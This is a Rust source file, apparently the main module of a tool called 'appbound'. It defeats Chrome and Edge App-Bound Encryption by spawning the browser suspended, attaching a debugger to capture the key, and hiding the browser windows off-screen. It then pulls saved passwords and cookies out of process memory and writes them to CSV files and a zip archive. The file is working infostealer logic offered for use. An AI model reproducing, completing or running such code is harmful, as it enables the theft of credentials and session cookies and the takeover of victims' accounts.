mod crypto;
mod db;
mod debug;
mod log;
mod mem;
mod pe;
mod process;
mod report;

use std::process::exit;
use std::thread;
use std::time::{Duration, Instant};

use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    DebugActiveProcess, DebugActiveProcessStop, DebugSetProcessKillOnExit,
};
use windows::Win32::System::Threading::{ResumeThread, TerminateProcess, PROCESS_INFORMATION};

use crate::db::{CookieRow, LoginRow};

const CHROME_EXE: &str = r"C:\Program Files\Google\Chrome\Application\chrome.exe";
const EDGE_EXE: &str = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";

/// How long to wait for the spawned browser to load its profile databases.
/// Edge in particular does extra first-launch work after being killed, so
/// keep this generous.
const PROFILE_DB_TIMEOUT: Duration = Duration::from_secs(30);

struct BrowserSpec {
    name: &'static str,
    exe: &'static str,
    module: &'static str,
}

fn file_name(path: &str) -> &str {
    path.rsplit(['\\', '/']).next().unwrap_or(path)
}

fn banner() {
    crate::log_out!("appbound v0.1.0");
    crate::log_out!("Captures the current user's browser App-Bound Encryption key and");
    crate::log_out!("exports the default profile's saved passwords and cookies.\n");
}

fn main() {
    let code = app();
    crate::log_out!("");
    crate::log_out!("--- Run finished (exit code {code}). Output was also saved to appbound.log ---");
    crate::log_out!("Press Enter to close...");
    let mut line = String::new();
    let _ = std::io::stdin().read_line(&mut line);
    exit(code);
}

fn app() -> i32 {
    banner();

    let specs = [
        BrowserSpec {
            name: "Chrome",
            exe: CHROME_EXE,
            module: "chrome.dll",
        },
        BrowserSpec {
            name: "Edge",
            exe: EDGE_EXE,
            module: "msedge.dll",
        },
    ];

    let mut logins: Vec<LoginRow> = Vec::new();
    let mut cookies: Vec<CookieRow> = Vec::new();

    for spec in &specs {
        if let Some((browser_logins, browser_cookies)) = process_browser(spec) {
            crate::log_out!(
                "[+] {}: {} password(s), {} cookie(s)",
                spec.name,
                browser_logins.len(),
                browser_cookies.len()
            );
            logins.extend(browser_logins);
            cookies.extend(browser_cookies);
        }
        crate::log_out!("");
    }

    if logins.is_empty() && cookies.is_empty() {
        crate::log_err!("[-] Nothing was captured from either browser");
        return 1;
    }

    if let Err(e) = report::write_reports(&logins, &cookies) {
        crate::log_err!("[-] Failed to write reports: {e}");
        return 1;
    }

    crate::log_out!(
        "[+] Wrote passwords.csv, cookies.csv and browser_data.zip ({} password(s), {} cookie(s))",
        logins.len(),
        cookies.len()
    );
    0
}

fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)> {
    crate::log_out!("[*] Targeting {} ({})", spec.name, spec.exe);

    // A running or prelaunched instance would make the new process hand off
    // its work and exit before we can trap the decryption. Give the phase one
    // retry for the prelaunch race where Edge respawns a background instance
    // right between our kill and our spawn.
    let mut outcome = debug::DebugOutcome {
        candidates: Vec::new(),
        saw_module: false,
    };

    // If the winning attempt is the second one, these hold that attempt's
    // handles; the loop only proceeds past `break` when it captured candidates.
    let mut pi = PROCESS_INFORMATION::default();

    for attempt in 0..2 {
        if attempt > 0 {
            crate::log_out!("[*] Retrying the {} phase (singleton handoff race suspected)", spec.name);
        }
        process::ensure_no_instances(file_name(spec.exe), None);

        pi = match process::spawn_suspended(spec.exe) {
            Ok(pi) => pi,
            Err(e) => {
                crate::log_err!("[-] {e} (is {} installed?)", spec.name);
                return None;
            }
        };
        crate::log_out!(
            "[+] Started a suspended {} process, PID {}",
            spec.name, pi.dwProcessId
        );

        // While the spawned process is still suspended it has not claimed the
        // profile's process singleton yet: kill any prelaunched instance Edge
        // spawned in the meantime, then let ours win the singleton handoff.
        process::ensure_no_instances(file_name(spec.exe), Some(pi.dwProcessId));

        unsafe {
            if ResumeThread(pi.hThread) == u32::MAX {
                crate::log_err!("[-] ResumeThread failed");
                cleanup(&pi);
                return None;
            }
        }

        // Park the browser's windows off-screen while we work.
        process::park_windows_offscreen(pi.dwProcessId);

        if let Err(e) = unsafe { DebugActiveProcess(pi.dwProcessId) } {
            crate::log_err!("[-] DebugActiveProcess failed: {e}");
            cleanup(&pi);
            return None;
        }
        crate::log_out!("[+] Debugger attached");

        outcome = debug::run(pi.hProcess, pi.dwProcessId, spec.module);

        unsafe {
            let _ = DebugSetProcessKillOnExit(false);
            let _ = DebugActiveProcessStop(pi.dwProcessId);
        }

        if !outcome.candidates.is_empty() || outcome.saw_module {
            break;
        }
        // No module load at all: the process either handed off or died during
        // startup. Tear everything down and try once more.
        crate::log_out!(
            "[*] The {} process exited before its module loaded; retrying",
            spec.name
        );
        cleanup(&pi);
        process::terminate_matching(file_name(spec.exe), None);
    }

    if outcome.candidates.is_empty() {
        crate::log_err!("[-] Failed to capture any {} key candidate", spec.name);
        cleanup(&pi);
        process::terminate_matching(file_name(spec.exe), None);
        return None;
    }
    let candidates = outcome.candidates;
    crate::log_out!(
        "[+] Collected {} key candidate(s) from {}",
        candidates.len(),
        spec.name
    );

    // Give the browser time to load its profile databases, then steal the
    // mapped images out of memory: Login Data lives in the browser process,
    // Cookies in the network service process. The key candidates are picked
    // apart by validating them against real encrypted blobs.
    let (login_image, cookie_image) = gather_profile_databases(spec, pi.hProcess);

    let logins = match login_image {
        Some(image) => db::extract_logins(spec.name, &image, &candidates),
        None => {
            crate::log_err!("[-] The Login Data database was not found in memory");
            Vec::new()
        }
    };
    let cookies = match cookie_image {
        Some(image) => db::extract_cookies(spec.name, &image, &candidates),
        None => {
            crate::log_err!("[-] The Cookies database was not found in memory");
            Vec::new()
        }
    };

    cleanup(&pi);
    // Also take down the child processes the browser spawned.
    process::terminate_matching(file_name(spec.exe), None);

    if logins.is_empty() && cookies.is_empty() {
        crate::log_err!("[-] {} yielded no data", spec.name);
        return None;
    }

    Some((logins, cookies))
}

fn gather_profile_databases(
    spec: &BrowserSpec,
    main_process: HANDLE,
) -> (Option<Vec<u8>>, Option<Vec<u8>>) {
    let deadline = Instant::now() + PROFILE_DB_TIMEOUT;
    let mut login_image = None;
    let mut cookie_image = None;

    loop {
        if login_image.is_none() {
            login_image = db::find_default_profile_file(main_process, "Login Data");
        }
        if cookie_image.is_none() {
            if let Some(h) = process::open_network_process(file_name(spec.exe)) {
                cookie_image = db::find_default_profile_file(h, "Cookies");
                unsafe { let _ = CloseHandle(h); };
            }
        }

        if login_image.is_some() && cookie_image.is_some() {
            break;
        }
        if Instant::now() >= deadline {
            break;
        }
        if !process::is_alive(main_process) {
            crate::log_err!(
                "[-] The {} process exited (code {:#x}) while waiting for the profile databases",
                spec.name,
                process::exit_code_of(main_process)
            );
            break;
        }
        thread::sleep(Duration::from_secs(1));
    }

    (login_image, cookie_image)
}

fn cleanup(pi: &PROCESS_INFORMATION) {
    unsafe {
        let _ = TerminateProcess(pi.hProcess, 0);
        let _ = CloseHandle(pi.hThread);
        let _ = CloseHandle(pi.hProcess);
    }
}
